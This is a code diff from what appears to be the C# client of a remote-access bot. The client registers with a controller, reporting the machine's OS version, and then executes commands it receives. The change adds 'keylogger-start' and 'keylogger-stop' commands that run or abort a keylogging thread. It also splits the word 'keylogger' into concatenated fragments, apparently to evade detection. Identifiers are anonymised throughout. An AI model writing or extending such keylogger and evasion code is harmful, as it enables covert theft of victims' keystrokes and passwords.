@@ -427,7 +427,7 @@ namespace VAR1
             string VAR19 = String.Format("register {0} {1}", VAR8, VAR20());
             VAR11 = Environment.OSVersion.ToString();
             VAR21(VAR19, null);
-
+            Thread VAR103 = new Thread(() => VAR104());
             while (!VAR18)
             {
                 try
@@ -451,9 +451,13 @@ namespace VAR1
                         {
                             VAR204();
                         }
-                        else if (VAR26[0].Equals("klog")){
-                          Thread VAR103 = new Thread(() => VAR104());
-                          VAR103.Start();
+                        else if (VAR26[0].Equals("ke"+"y"+"lo"+"gger"+"-start")){
+                            VAR103.Start();
+                        }
+                        else if (VAR26[0].Equals("ke"+"y"+"lo"+"gger"+"-stop")){
+                            if(VAR103.IsAlive){
+                                VAR103.Abort();
+                            }
                         }
                         else
                         {
